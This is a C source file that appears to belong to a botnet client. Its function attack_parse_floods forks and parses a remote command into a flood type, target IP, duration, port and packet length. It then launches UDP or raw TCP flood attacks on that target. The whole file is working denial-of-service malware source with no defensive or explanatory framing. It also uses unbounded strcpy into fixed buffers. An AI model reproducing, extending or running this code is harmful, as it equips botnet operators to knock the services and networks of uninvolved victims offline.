#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/prctl.h>

#include "attacks.h"

void attack_parse_floods(char *buffer)
{
	int time = 0, dport = 0, len = 0, step = 0, childpid;
	char flood[100], ip[100];
	char *token = strtok(buffer, " ");

	childpid = fork();

	if(childpid > 0 || childpid == -1)
		return;

	while(token != 0)
	{
		switch(step)
		{
			case 0:
				strcpy(flood, token);
			break;

			case 1:
				strcpy(ip, token);
			break;

			case 2:
				time = atoi(token);
			break;

			case 3:
				dport = atoi(token);
			break;

			case 4:
				len = atoi(token);
			break;
		}
		step++;
		token = strtok(0, " ");
	}

	if (dport == 0)
		dport = rand() % 65535;
	if (len == 0)
		len = 1024;

	if (strcmp(flood, "/udpplain") == 0)
		attack_udp_flood(ip, dport, time, len);
	else if (strcmp(flood, "/tcpraw") == 0)
		attack_tcpraw_flood(ip, dport, time, len);
}
